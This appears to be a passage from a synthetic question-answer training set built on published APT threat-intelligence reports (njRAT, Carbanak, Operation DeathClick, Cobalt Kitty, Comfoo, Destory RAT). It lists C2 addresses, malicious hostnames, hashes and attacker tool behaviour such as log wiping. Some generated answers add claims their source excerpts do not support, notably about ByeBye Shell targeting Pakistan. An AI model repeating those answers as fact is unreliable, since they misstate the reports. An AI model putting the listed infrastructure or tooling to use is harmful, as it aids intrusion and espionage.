Ygbm90ZXBhZCBVbnRpdGxlZCAtIE5vdGVwYWQBDQpFeHBsb3JlciBwYXNzd29yZDogMTIzNDU1W0JhY2tdNg0KAT EzLzA2LzA2IG5vdGVwYWQgVW50aXRsZWQgLSBOb3RlcGFkAQ0KYXNkZmQ=[endof]P[endof]P[endof]\nThe encoded data sent by the Victim system was the keystrokes collected into the keylogger file in the Victim. The data decodes to:\n- Get Passwords window\no \"ret|'|'|\"\no \"pl|'|'|\"\nMain potential network traffic indicators of C2 activity through its \"Get Passwords\" window:+1800.652.4020\nret|'|'|682dfec8c66a0de6f1475ca73c462a69|'|'|([endof]bla[endof]pl|'|'|682dfec8c66a0de6f1475ca73c462a69|'|'|0[endo f]ret|'|'|682dfec8c66a0de6f1475ca73c462a69|'|'|KiAqICogKiAqICogKiAqICogKiA=[endof]\nAnswer this question: What specific network traffic indicators can be observed when njRAT uses its 'Process Manager' window to interact with processes on the victim system, and how can these indicators be used to identify and respond to an active njRAT infection?",
    "output": "When njRAT uses its 'Process Manager' window, specific network traffic indicators include commands like 'proc|'|'|' for process listing and 'k|'|'|[Process_ID]' for killing a process. For example, the command 'k|'|'|1396' was used to kill the process with ID 1396 (C:\\\\WINDOWS\\\\system32\\\\notepad.exe). Security analysts can identify these indicators by monitoring network traffic for such patterns. By setting up alerts for these specific command structures, they can quickly detect and respond to an active njRAT infection, potentially preventing further damage and lateral movement within the network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ByeBye Shell and the targeting of Pakistan\nPosted by Claudio Guarnieri in Information Security on Aug 19, 2013 2:10:45 PM\nAsia and South Asia are a theater for daily attacks and numerous ongoing espionage campaigns between neighboring countries, so many campaigns that it's hard to keep count. Recently I stumbled on yet another one, which appears to have been active since at least the beginning of the year, and seems mostly directed at Pakistani targets.\nIn this article we're going to analyze the nature of the attacks, the functionality of the backdoor - here labelled as ByeBye Shell - and the quick interaction I had with the operators behind this campaign.\nRead the text above and answer this question: Why was the ByeBye Shell campaign particularly challenging to track and analyze, and how did its focus on Pakistani targets influence its operational strategy?",
    "output": "The ByeBye Shell campaign was particularly challenging to track and analyze due to the high volume of ongoing espionage activities in Asia and South Asia. The region is a theater for daily attacks and numerous campaigns, making it difficult to distinguish individual operations. The campaign's focus on Pakistani targets influenced its operational strategy by tailoring the attacks to exploit vulnerabilities specific to Pakistan's digital infrastructure and political climate. This targeted approach allowed the campaign to remain under the radar while effectively gathering intelligence on Pakistani entities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 4.3 LINUX SECONDARY ATTACKER TOOLS\nThe attackers downloaded additional tools from IP address 95.215.46.116 for the purposes of conducting internal reconnaissance and moving laterally between the Linux and Windows environments. These tools included the WINEXE version 1.1 remote command execution utility, a version of the ALW \"Advanced Log Wiper\" posted by \"security40bscurity at 0xbscured.net\" posted to Pastebin on July 7, 2015, and SecPoint's PSCAN multithreaded IP port scanner. With these tools, the attackers traversed the internal network beginning with the shortest hop points first and migrating outward. Example executions of each of these tools are shown in Figure 20 through Figure 23.\nSmall Headline: 4.3.2 ALW (Advanced Log Wiper, \"l\")\nThe ALW Advanced Log Wiper was initially downloaded to system BRAVO early in the intrusion as a method of removing specific indications of attacker activities from Linux host logs. ALW was originally written by \"security40bscurity\" and posted to Pastebin on July 7, 2015. This binary takes\nfour arguments: the user to remove from the target logs, the host to remove from the target logs, a specific terminal TTY value to remove from the target logs, or a specific target log file to remove. The usage message for this binary is shown in Figure 21.\nIf no file argument is given, ALW will remove all log entries with the specified user, host or TTY from the following logs:\nThe file information for ALW is shown in Table 8.\nSmall Headline: 4.3.3 PSCAN\nThe PSCAN binary found on host BRAVO is a TCP port scanning tool that attempts to create TCP socket connections to a specified port for every IP within a specified range. This functionality allows the attacker to check if specific commonly used ports are open for communication in systems within an IP range, thereby identifying available services for internal reconnaissance. The usage message for PSCAN is shown in Figure 22.\nAn example execution of PSCAN is shown in Figure 23, with the file information for this binary shown in Table 9.\nTheir decisions in which systems to access indicated that their next intended action was to gain access to the Windows Server environment. The attackers continued to conduct internal reconnaissance within both the Linux and Windows environments using stolen credentials to access Linux systems via SSH and the WINEXE utility to access Windows systems. The actions-on-objective during this time was composed of mapping the internal network with the PSCAN utility and collecting host information via resident Linux and Windows administrative command-line utilities.\nSmall Headline: 4.4.1 GOTROJ Remote Access Trojan\nOn D+30, the attackers installed a Windows Trojan, written in Go, as a Windows Service on one of the two primary Active Directory Domain Controllers. They would move to utilizing the GOTROJ as their primary method of ingress for the duration of the engagement. The GOTROJ Trojan communicated with C2 IP address 107.181.246.146 over TCP/443 for its remote access channel. This Trojan was much more fully featured than the\nprevious tools utilized by the attackers to this point, with eight primary functions designated by a command issued by the attackers. The commands and their functionality are shown in Table 10.\nThe commands are stored within the binary in an XOR encrypted segment, which is decrypted shortly after execution with the XOR key of 'dmdar,' or 0x646D646172. The section of code which calls the c_gosh_xstr_XorCrypt() function to decrypt the commands is shown in Figure 24.\nThis binary operates in one of two modes. The first is an ad hoc, interactive execution mode, in which the malware executes within the context of a user account. However, if the malware is executed as a user, there has to\nbe a file named 'xname.txt' in that user's temporary directory referenced by the environment variable '%TEMP%.' As this file was not found during this engagement and is not dropped by any of the tools used by the attackers, its contents are not known. However, when the malware begins to communicate with its C2, the contents of the file are the first thing encrypted and sent to the C2 server. The second method of GOTROJ utilization is execution under a Windows Service as a method of persistence. The attackers used this method of execution during this engagement, installing the GOTROJ binary as a service named WindowsCtlMonitor.\nThe network communication protocol this malware uses contains a very simplistic, but specific, header and format. The traffic sent and received by this malware is XOR encrypted with an XOR key that changes for every message sent or received. An example of the format in its encrypted form is shown in Figure 25.\nBA\n45\nBA\nB2\nBA BA BA\n99 C9 D2 DF D6 D6 B7 B0\nYellow\n= Null Bytes\nPink\n= ID Byte\nGreen\n= Length Byte\nGrey\n= Message\n.E.............\nFigure 25: Annotated Encrypted Form of GOTROJ Communication\nOnce decrypted with the XOR key (byte BA in the example above), the formatting of the message becomes considerably clearer. An illustration of this is shown in Figure 26.\nYellow\n= Null Bytes\nPink\n= ID Byte\nGreen\n= Length Byte\nGrey\n= Message\nFigure 26: Annotated Decrypted Form of GOTROJ Communication\nGiven this simplistic method of formatting and decryption, RSA analysts were able to effectively decrypt this traffic for review during the investigation, greatly increasing visibility into attacker actions. However, given that this malware utilizes a TCP socket connection for transport communications in a tunneling form, the custom communications protocol does not take packet boundaries into account in its design. Therefore, a single message may traverse multiple packets with no additional control bytes, such as the ID byte or length. Given this case, the method of decrypting the traffic was made more effective by extracting the payload above Layer 4 and decrypting that data independent of any data within Layers 2-4. The file information\nfor the three versions of GOTROJ observed in this incident is shown in Table 11, Table 12 and Table 13. All binaries use the same C2 IP address of 107.181.246.146.\n\nQ: Why did the CARBANAK actors choose to use the ALW (Advanced Log Wiper) tool, and how did this tool assist them in evading detection during their intrusion?",
    "output": "A: The CARBANAK actors chose to use the ALW (Advanced Log Wiper) tool to remove specific indications of their activities from Linux host logs. This tool, originally written by 'security40bscurity' and posted to Pastebin on July 7, 2015, takes four arguments: the user to remove from the target logs, the host to remove from the target logs, a specific terminal TTY value to remove from the target logs, or a specific target log file to remove. If no file argument is given, ALW will remove all log entries with the specified user, host, or TTY from the following logs. This helped the attackers in evading detection by cleaning up traces of their activities, making it harder for security teams to identify their presence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nMost targeted attacks against organizations originate as spear-phish campaigns or watering hole style web driveby attacks. Within the last six months, Invincea has discovered and stopped targeted malvertizing attacks against specific companies -- particularly those in the Defense Industrial Base. The combination of traditional cyber crime methods (malvertising) with targeted attacks against Defense industrials for theft of IP represents another development in the on-going blending of techniques from cyber crime and advanced threat actors with nation state agendas. We are tracking an on-going campaign against US Defense companies under the code name Operation DeathClick.\nTraditional malvertizing has been an effective but indiscriminate method cyber crime gangs use to compromise endpoints to perpetrate ad fraud, identity fraud, and banking credential theft. In this new targeted variation of malvertizing, the perpetrators are attacking specific organizations by leveraging real-time ad bidding networks and micro-targeting techniques developed over the last decade in online advertising. The objective of these micro-targeted attacks against the Defense sector is likely theft of Intellectual Property more than ad fraud and indicates motive and sophistication characteristic of advanced threat actors. Since these attacks were blocked by Invincea prior to compromise of the machine or network, we cannot confirm the specific IP the perpetrators are after \u2013 only the Tactics, Techniques, and Protocols (TTPs) used which we describe herein, similar to methods used to provide backdoor access and command and control over compromised networks.\nWhile we discovered these attacks across multiple Defense companies, we expect it will not be long, if not already, before other highly targeted segments including Federal, Financial Services, Manufacturing, and HealthCare are victimized with the same micro-targeted malvertising. The campaign described here does not represent a single flaw, 0-day, or unpatched bug, but rather a significant development in the adversary's capabilities and strategy to leverage legitimate online advertising platforms on well-known ad supported websites via a technique called Real-Time Ad Bidding. In other words, this problem will not be patched on Tuesday.\nUPDATE: We have updated this document to include a new section on a campaign of distributing CryptoWall ransomware via malvertising. While the attack vector is the same, we believe this to be motivated by cybercrime rather than theft of IP from Defense companies.\nBig Headline: Operation DeathClick: Targeting the US Industrial Base\nRecently, multiple US Defense/Aerospace contractors were targeted by a malvertising campaign. These contractors had deployed world-class enterprise security defense in depth approaches to protect their intellectual property. They had next generation firewalls that relied on threat intelligence feeds to do auto-blocking of known malicious sites. They had malware interception technology that relied on known bad hashes to prevent malicious downloads. The multiple proxies in place subscribed to real time feeds of known bad URLs. They deployed AV at the gateways and on the endpoints.\nBut in a two week period, these organizations were hit with dozens of micro-targeted malvertising attacks, each of which would have provided a beachhead for the threat actors from which to compromise the network, if successful. In each instance, the attacks were carried out by targeting these Defense contractors directly via real-time ad bidding. Once targeted, an end user only needed to browse to any website, anywhere in the world, which contained a DoubleClick ad-partner embedded window.  Invincea stopped these attacks on the endpoints by containing the delivered exploits in secure virtual containers, while producing the forensics that led to this discovery.\nNext we go in some detail about example attacks perpetrated against the defense firms.\nIt is important to note that the websites we show next that served up targeted malvertising were victims of malvertising campaigns with no knowledge of the malicious ads they were serving up. These malicious ads were served up by 3rd party networks, who are unwittingly sourcing malicious content. As we will discuss later, the 3rd party ad networks themselves are falling victim to malicious content campaigns.\nBig Headline: Summary for Incident at Fleaflicker.com\nA user visited his online fantasy football league homepage at Fleaflicker.com. As soon as the page loaded, a malicious ad delivered a backdoor Trojan via a Java-based exploit.\nFigure 1 shows a screenshot of the page that was visited. You will notice the two inline ad placements for DoubleClick ad delivery. The malware delivered came from a compromised Polish website, and would have installed a generic backdoor Trojan.\nNote the prominent ad placements by AdChoice, a DoubleClick affiliate. Figure 2 shows an event tree of the exploit and malware delivered from an ad by visiting Fleaflicker.com.\nThe event tree in Figure 2 taken from Invincea's Threat Management Console shows the exploited Java process dropped a file called fvJcrgR0.exe, and that it likely came from Pubmatic, an ad delivery network that allows for real time bidding to deliver ads.  In this instance, the Pubmatic server redirected to a Web server in Poland that dropped the malware.  The timeline below shows the exact times and URLs visited.\nNote the number of re-directs from Fleaflicker.com to different outside properties in Figure 3.\nInvincea Threat Management provides a quick way to search for an MD5 hash on third party sites (see Figure 4).  By clicking the VirusTotal link, the analyst will see the following VirusTotal report in Figure 5:\nFrom the VirusTotal report in Figure 5, you will see that this malware is a Trojan backdoor that would likely be used to download additional malware or to provide remote persistent access to the attacker.\nBig Headline: Summary for Incident at Gpokr.com\nAn employee at a defense contractor visited a free Texas Poker online game. The Poker site had advertisements on the page, one of which launched a similar attack as seen in before on other websites visited by employees at this firm.\nIt should be noted that Gpokr.com no longer appears to be serving advertisements from their site. At the time of the incident, as seen in the logs below, an ad window was previously present. In the event tree shown in Figure 7, you will see that the winning bid redirected to a direct-to-IP site instead of a site via domain name. Also, above is the first indication of specific executable DLL files. Searches for these filenames returned zero results on VirusTotal.\nThis event on September 14 (Figure 8) shows that delivery.first-impression.com redirected directly to an IP address, not a domain name to deliver its malicious payload. Note the multiple DLL files written to disk and the spawning of rundll32.exe. At this point, the Invincea-protected host recognized the unauthorized process and reverted itself to a clean state.\nBig Headline: Summary for Webmail.earthlink.net\nIn another incident an employee checked their online Earthlink account. When they replied to an email, a new ad was loaded on a page that attempted to exploit Java. This malvertising was from the same IP address seen in other incidents.\nYou will notice the inline advertisements on this page in Figure 9. The event tree in Figure 10 notes that this was likely a spear-phish attack. The timeline will show that when the user replied to an email, the ads on the Earthlink page refreshed, dropping the exploit code via Java.\nNote in the timeline in Figure 11, how there was a 7 minute gap between the DoubleClick ad redirect and the delivery.first-impression.com ad. This is an indication that the page was refreshed or the ad was refreshed on the page. The same exploit IP address from the Gpokr event is present. This event is the oldest, happening on September 11.\nRead the text above and answer this question: How did Operation DeathClick leverage real-time ad bidding to target specific organizations, and what were the implications of this approach?",
    "output": "Operation DeathClick utilized real-time ad bidding to target specific organizations, particularly those in the Defense Industrial Base. This approach allowed the threat actors to deliver malicious ads to end users who visited any website containing a DoubleClick ad-partner embedded window. The implication of this approach is that it bypassed traditional security measures such as threat intelligence feeds, known bad hashes, and real-time feeds of known bad URLs, as the ads were dynamically generated and targeted based on real-time data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nOperation Cobalt Kitty was a major cyber espionage APT that targeted a global corporation in Asia and was carried out by the OceanLotus Group. The analysis of this APT proves how determined and motivated the attackers were. They continuously changed techniques and upgraded their arsenal to remain under the radar. In fact, they never gave up, even when the attack was exposed and shut down by the defenders.\nDuring the investigation of Operation Cobalt Kitty, Cybereason uncovered and analyzed new tools in the OceanLotus Group's attack arsenal, such as:\nNew backdoor (\"Goopy\") using HTTP and DNS Tunneling for C2 communication.\nUndocumented backdoor that used Outlook for C2 communication and data exfiltration.\nBackdoors exploiting DLL sideloading attacks in legitimate applications from Microsoft, Google and Kaspersky.\nThree customized credential dumping tools, which are inspired by known tools.\nIn addition, Cybereason uncovered new variants of the (<https://securelist.com/blog/research/78203/use-of-dns-tunneling-for-cc-communications/>)\"Denis\" backdoor and managed to attribute the backdoor to the OceanLotus Group \u2013 a connection that had not been publicly reported before.\nThis report provides a rare deep dive into a sophisticated APT that was carried out by one of the most fascinating groups operating in Asia. The ability to closely monitor and detect the stages of an entire APT lifecycle \u2013 from initial infiltration to data exfiltration \u2013 is far from trivial.\nThe fact that most of the attackers' tools were not detected by the antivirus software and other security products deployed in the company's environment before Cybereason, is not surprising. The attackers obviously invested significant time and effort in keeping the operation undetected, striving to evade antivirus detection.\nAs the investigation progressed, some of the IOCs observed in Operation Cobalt Kitty started to emerge in the wild, and recently some were even reported being used in (<https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html>)other campaigns. It is important to remember, however, that IOCs have a tendency to change over time. Therefore, understanding a threat actor's behavioral patterns is\nessential in combatting modern and sophisticated APTs. The modus operandi and tools served as behavioral fingerprints also played an important role in tying Operation Cobalt Kitty to the OceanLotus Group.\nLastly, our research provides an important testimony to the capabilities and working methods of the OceanLotus Group. Operation Cobalt Kitty is unique in many ways, nonetheless, it is still just one link in the group's ever-growing chain of APT campaigns. Orchestrating multiple APT campaigns in parallel and attacking a broad spectrum of targets takes an incredible amount of resources, time, manpower and motivation. This combination is likely to be more common among nation-state actors. While the are many rumours and speculations circulating in the InfoSec community, at the time of writing, there was no publicly available evidence that can confirm that the OceanLotus Group is a nation-state threat actor.\nUntil such evidence is made public, we will leave it to our readers to judge for themselves.\nTo be continued \u2026 Meow.\n\nQ: What role did the analysis of the attackers' behavioral patterns play in attributing Operation Cobalt Kitty to the OceanLotus Group, and why is understanding these patterns crucial in combating modern APTs?",
    "output": "A: The analysis of the attackers' behavioral patterns played a crucial role in attributing Operation Cobalt Kitty to the OceanLotus Group. The modus operandi and tools used by the attackers served as behavioral fingerprints, which helped in tying the operation to this specific threat actor. Understanding a threat actor's behavioral patterns is essential in combating modern and sophisticated APTs because indicators of compromise (IOCs) tend to change over time. By focusing on behavioral patterns, defenders can better anticipate and respond to evolving threats, even as the specific tools and techniques used by the attackers change.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How can adversaries utilize Search Open Technical Databases: WHOIS to gather information about a target organization, such as Tranchulas, and what specific details can be obtained from WHOIS data to facilitate further reconnaissance or exploitation?",
    "output": "Adversaries can use Search Open Technical Databases: WHOIS to gather information about a target organization, such as Tranchulas, by querying public WHOIS data for details about their registered domain. This can reveal actionable information such as assigned IP blocks, contact information, and DNS nameservers. In the case of Tranchulas, WHOIS data could potentially reveal information about their hosting provider, VPSNOC, and its connection to Digital Linx, a Pakistan-based hosting company. This information could be used to identify potential vulnerabilities in Tranchulas' infrastructure or to establish a trusted relationship with the organization. Furthermore, WHOIS data could also provide insight into Tranchulas' business operations, such as their address and contact information, which could be used to facilitate phishing attacks or other forms of social engineering. By analyzing WHOIS data, adversaries can gain valuable information about a target organization's online presence and use it to inform further reconnaissance or exploitation efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why is counting the number of infected hosts purely by IP addresses problematic, and how does this relate to the size of a targeted document-stealing network like the Shadow network?",
    "output": "Counting the number of infected hosts purely by IP addresses is problematic because botnets are generally much smaller than the total sum of unique IP addresses would suggest. This discrepancy occurs because a single infected host can have multiple IP addresses, and some IP addresses might be dynamically assigned and shared among different devices. In the case of the Shadow network, which is focused on stealing documents from specific targets, the network is expected to be small in size. This expectation aligns with the observation that targeted, document-stealing networks typically have fewer infected hosts compared to broader, less targeted botnets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Conclusion\nComfoo is the tip of an iceberg. The CTU research team notified many Comfoo victims, either directly or through the computer security incident response teams (CSIRTs) in their respective country. Analysis was also shared with law enforcement. Based on the number of campaign tags observed in malware samples versus those seen in live monitoring by the CTU research team, there are likely hundreds more unidentified victims.\nMost businesses will never see a Comfoo infection. However, evaluating whether an organization is a potential target of cyber-espionage is important in any risk evaluation. Chief information security officers should maintain awareness of any reported cyber-espionage threats in their business sector. If one player in an industry is targeted, it is likely all major players (or newcomers with interesting technology) in that industry will be targets at some point.\nOrganizations compromised by Comfoo (or most types of APT malware) likely face a major forensic and eradication effort. This effort should be followed by a major investment in security measures to keep cyber-espionage actors out of the network. Many in-house security teams do not have the (<http://go.secureworks.com/advancedthreats>)APT expertise to respond to a persistent threat that requires a persistent, active, and layered defense model spanning the entire attack surface of an organization. As a result, the organization might need outside expertise to effectively mitigate these types of threats.\nBig Headline: Appendix: Comfoo hostnames for blacklisting consideration\naccounts . ddns . info active . googleupdate . hk active . nifty-user . com addr . googleupdate . hk ahn06 . myfw . us allroot80 . 4pu . com apf . googleupdate . hk aptlkxqm . 25u . com back . agfire . com back . winsupdate . com bbs . dynssl . com bbs . gladallinone . com bigdog . winself . com billgates . itsaol . com bjllgvtms . effers . com blizzcon . sexidude . com blizzcon . sexxxy . biz buffet80 . bigmoney . biz buffet80 . itsaol . com buffet . bbsindex . com bxpudqx . otzo . com\nmy . amazingrm . com my . officebeautyclub . com myweb . wwwcrazy . com nevruz . mrface . com news . mcesign . com news . rumorse . com news . win . dnset . com news . wintersunshine . net night . mefound . com nikimen . etowns . net nslsa . microupdata . com nsser . systemsupdata . com nsservic . googleupdate . hk nunok . ninth . biz oct . clawsnare . com offer . eosboxster . com okkou . 9966 . org park006 . myfw . us pazar . vicp . net pcnews . rr . nu pcpc . helpngr . net\nmsnsupport . servehttp . com\nzp . amazingrm . com zp . tpznet . com\n\nWhy is it crucial for chief information security officers to stay informed about cyber-espionage threats within their industry, particularly in the context of Comfoo?",
    "output": "It is crucial for chief information security officers to stay informed about cyber-espionage threats within their industry because if one player in an industry is targeted, it is likely that all major players or newcomers with interesting technology in that industry will be targets at some point. This awareness helps in evaluating whether an organization is a potential target of cyber-espionage, which is important in any risk evaluation. By staying informed, CISOs can better prepare and implement security measures to protect their organizations from advanced persistent threats like Comfoo.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why is it significant that the Nitro APT group continues to use old C2 infrastructure despite evolving their techniques within the kill chain?",
    "output": "It is significant that the Nitro APT group continues to use old C2 infrastructure despite evolving their techniques within the kill chain because it demonstrates the value of tracking these threats over time. By reusing old C2 infrastructure, such as the IP 223.25.233.248 and the domain good.myftp[.]org, the group inadvertently allows security researchers to uncover and properly attribute new indicators of compromise (IOCs). This practice highlights the importance of continuous monitoring and historical analysis in detecting and mitigating advanced persistent threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: FIGURE 10: TEXT OF A SOCIALLY ENGINEERED EMAIL ASSOCIATED WITH WWW.ADV138MAIL.COM\nThe domain 'www.adv138mail.com' is\t also\t associated with\t malware detected by\t antivirus software as 'Backdoor.Win32.Delf.abow' 61 .\t Other known subdomains include:\n\u0141 'asm.adv138mail.com',\n\u0141 'dns.adv138mail.com',\n\u0141 'ftp.adv138mail.com',\n\u0141 'ihi.adv138mail.com'62 ,\n\u0141 'nov.adv138mail.com'.\nThese domains (with the possible exception of the 'dns' and 'ihi' subdomains) have all pointed to the same infrastructure 63 as the domains 'pu.flower\u00adshow.org' and 'www.mailsignin.net'.\t That shared infrastructure is\t known to\t have been used to send socially\t engineered emails that\t contained\t an attachment\t named 'invtation.pdf' [sic].\t Similar to the 'Meeting\t Agenda' attachment, 'invtation' installs a Poison Ivy\t RAT,\t but one configured to communicate with the callback domain 'pu.flower\u00adshow.org'64.\t The text used in the emails is shown in Figure 1165 .\n61 The malware with MD5 hash 'F0B8 48A8\t 41D4 EF34 06A6\t F9C4 766C\t 540B' modifies\t the 'hosts' file on computers\t it is run on so that the file contains\t an entry for 'www.adv138mail.com'. (ThreatExpert Ltd., 2011)\n62 The domain 'ihi.adv138mail.com'\t is\t listed\t as a Backdoor:Win32/Thoper.A callback\t location. (Wong,\t 2011)\n63 The domains\t previously pointed\t to a C2\t server located\t at IP address 112.121.171.94.\n64 The socially engineered email that communicated back to 'pu.flower\u00adshow.org'\t was\t sent from IP\t address 112.121.171.94 \u2013 the same IP\t address to which the callback domain pointed.\n65 Email courtesy of Mila\t Parkour of 'contagiodump.blogspot.com'. (Parkour, contagio: Jul 5\t CVE\u00ad2010\u00ad2883 PDF invitation.pdf with Poison Ivy from 112.121.171.94 | \tpu.flower\u00adshow.org, 2011)\nDear Sir/Madam,\nI'm greatly honored to invite you to the seminar about technology, which will be held on 28th,July.We would appreciate it if you would take your spare time to share the occasion with us. The detail information is in the attachment. Please confirm your participation at your earlist convenience. Looking forward to your reply.Thanks very much.\nBest Regards,\n<purported sender>\nSmall Headline: Additional Destory\t RAT Links\nIn\t addition to having\t previously\t shared infrastructure with the known Destory RAT callback domain 'www.adv138mail.com',\t the domain 'www.mailsignin.net' has also previously\t shared infrastructure with\t at least\t two other known Destory RAT\t callback domains.\t The domain 'www.mailsignin.net' previously\t pointed\t to\t IP address 175.45.22.220,\t as did\t the known Destory RAT\t callback domains 'newhose.ntimobile.com' and 'sms.servegame.com'66 .\t A number of\t subdomains of the Destory\t RAT\u00adassociated\t domain 'join3com.com' also\t previously\tpointed\t to the same IP address67 .\nThese links suggest that\t many\t attacks in which the Destory\t RAT\t has been used are linked,\t not\t only\t by\t the malware, but\t also\t through C2 infrastructure. This\t further supports the notion that the Destory\t RAT\t was developed by,\t or for, particular attackers and\t that\t most,\t if not\t all,\t of\t the malicious activity involving it\t is\tattributable to those attackers.\nThe Destory callback domains also\t have links to additional malware.\t For example,\t the domain 'network\u00adsec.net' has been used\t by\t the Destory\t RAT ('gm1.network\u00adsec.net'),\t by\t Poison Ivy malware ('yoyo.network\u00adsec.net' 68 ) and\t by\t 'Backdoor\u00adFCQ'\n('pingabm.network\u00adsec.net',' 'psbm11025.network\u00adsec.net' and\t 'psbm10.network\u00adsec.net'69).\n66 The domains 'newhose.ntimobile.com' and 'sms.servegame.com' are listed as known callbacks for Backdoor.Sogu and Thoper.A respectively. (Wong,\t 2011) (Mullaney, 2011)\n67 The 'join3com.com'\t subdomains '123.join3com.com', 'dow.join3com.com', 'ftp.join3com.com', and 'ico.join3com.com' are all known to have pointed to IP\t address 175.45.22.220. The domain 'catalog.join3com.com' is listed\t as\t a known Backdoor:Win32/Thoper.A callback\t location. (Wong,\t 2011)\n68 The domain 'yoyo.network\u00adsec.net'\t is\t used by malware with MD5\t hash '3703 7F67 4BCB\t BB7E EF38 89AB\t 6EB3\t 0268'. (Threat Expert Ltd., 2008)\nSmall Headline: Compromised Code\tSigning Certificate\nThe observed LURK\t communications appear to be the same as those generated by malware that\t was digitally\t signed using\t a compromised code signing certificate that\t was used to sign a Destory\t RAT, and\t other malware used\t in several attacks 70 .\t That malware communicates with\t the domain 'office.windowupdate.org' \u2013 a domain that is\t linked to 'alyac.org' not\t only\t by\t the communications protocol but\t also by\t both domain registration tactic and infrastructure71 .\t (Fagerland,\t 2011)\nSmall Headline: Travlman Links\nThe Destory\t RAT\t malware used\t in the SK\t Communications hack72 is\t identical,\t except for its configuration, to\t malware73 that communicates with the callback domain 'wow.travlman.com'.\t The callback domain previously pointed\t to\t the same IP address as that\t used\t in the SK\t Communications hack74 .\t Both\t of\t the malicious files were compiled from the same code on 27 September 2010 at 09:17:04 Greenwich Mean Time (GMT)75 ,\t and later configured.\nThe callback domain 'wow.travlman.com' is\t also\t used by\t malware 76 that produces 'IP2B' communications of an identical format\t to those decoded from the 'Extra\u00adData' in the Murcy\t communications.\t This\t highlights an additional link\nbetween the Destory\t RAT and\t the IP2B communications.\n69 Backdoor\u00adFCQ uses\t several\t 'network\u00adsec.net' subdomains\t as callback locations. (McAfee Inc., 2011)\n70 The first reported abuse of the certificate was in relation to the Hupigon trojan with MD5\t hash\t '8800 8398\n71A3\t 3801 B2B4 6F9E 23B7 B7A5'. (Hispasec Sistemas, 2011) (Common Computer Security Standards)\n71 Refer to the 'LURK Communications' section for additional information.\n72 The Destory RAT used in the SK\t Communications\t hack\t was hosted\t on a toolbox as 'nateon.exe', and\t called back\t to 'nateon.duamlive.com'. It has a SHA1 hash of 'F84C D73D ABF1 8660 7F98\t 6DF9 8C54 02A5\t 7BB5 8AD1'\t and MD5 of '4618 84F1 D41E 9E07 09B4\t 0AB2\t CE5A FCA7'. (Command Five Pty Ltd, 2011)\n73 Malware with\t the MD5\t hash '5FCE 1FC1 8283 D76C 396A 3CCC 64BD BBDE'\t calls back to 'wow.travlman.com'.\n74 Both\t 'wow.travlman.com'\t and\t 'duamlive.com'\t previously pointed to IP address\t 203.160.67.131. (rbls, shenqi.travlman.com is not listed\tin any blacklists, 2011) (DomainTools, LLC)\n75 Automated analysis reports confirm the compilation time of the code and that, while the MD5 hash of each\t of the files is\t different, the MD5\t hashes\t of each of the code sections, except for the .data section, are identical. (Hispasec Sistemas, 2011) (Hispasec Sistemas, 2011)\n76 Malware with\t MD5\t hash 'B098\t AEE1 6BD1\t 38C4\t 1207 5C9D 315A\t EFC9'. (Threat Expert Ltd, 2010)\nSeveral other 'travlman.com' sub\u00addomains are known to\t exist 77 including at\t least one that is associated with\t malware. The sub\u00addomain 'dm.travlman.com'78 is\t the callback used by\t malware detected by antivirus software as 'Trojan:Win32/Boupke'79.\nSmall Headline: X\u00adShell RAT\nThe X\u00adShell RAT is\t commercially\t available software that appears to\t have been used in a number of attacks.\t There are numerous versions of the X\u00adShell RAT,\t and not all produce the same communications.\nMalware that\t generates the same X\u00adShell C601 communications 80 observed to\t 'path.alyac.org' appears to\t have been used in a number of attacks. Malware that\t generates similar communications also\t appears to have been used in a number of\t attacks81 .\t That\t malware is\t thought\t to be an X\u00adShell C603\t RAT\t and\t not an X\u00adShell C601\t RAT.\t It\t is\t not\t known whether any\t of these malicious files were used\t by the same\nattackers who\t used the X\u00adshell malware which\t communicates with 'path.alyac.org'.\n77 The following\t are known 'travlman.com' subdomains; 'dm.travlman.com', 'g.travlman.com', 'g1.travlman.com', 'g2.travlman.com', 'luandao.travlman.com', 'mail.travlman.com', 'seo.travlman.com', 'shenqi.travlman.com', 'wayi.travlman.com', and\t'www.travlman.com'.\n78 Malware with MD5 hash '70A8\t 8091 E1F9\t A7BE E246\t 488C CE79 936A'\t is known to request the webpage 'http://dm.travlman.com/up.txt'. (Sunbelt Security, 2009)\n79 Malware with\t MD5\t hash '70A8\t 8091 E1F9\t A7BE E246\t 488C CE79 936A' is detected by antivirus software as 'Trojan.Win32.Boupke!IK', 'Trojan:Win32/Boupke.gen!A', and 'Trojan.Win32.Boupke'. (Hispasec Sistemas, 2009)\n80 Automated\t analysis\t reports exist on the Internet for probable\t X\u00adShell 601\t malware with\t MD5\t hash '6581 3CBB\t 660E 91CD 5FA0 8300 E177\t EB09', '2299 47CC 71A4 601B 8B77 94B4 02E5 36A9', 'DA2F 9831 5F4C 56FC E212 73E2 1E45 3B76', and 'F4C0 8D3D F5ED E079 0E34 EAE0 C5DB 8A7A'.(Hispasec Sistemas, 2011) (Threat Expert Ltd, 2011) (Threat Expert Ltd, 2011) (Threat Expert Ltd,\t 2011)\n81Automated\tanalysis\t reports exist on the Internet for probable X\u00adShell 603\t malware with\t MD5\thash '6799 93AD 2CF8 EFDC 788E 0BA2 04D6 9B0D', and 'CE93 8C64 7831 080B 7116 5389 E43E 744D'. (Hispasec Sistemas, 2011) (Hispasec Sistemas, 2011)\nQ: What insights can be gained from the use of the X-Shell RAT in multiple attacks, particularly in relation to the communications observed to 'path.alyac.org'?",
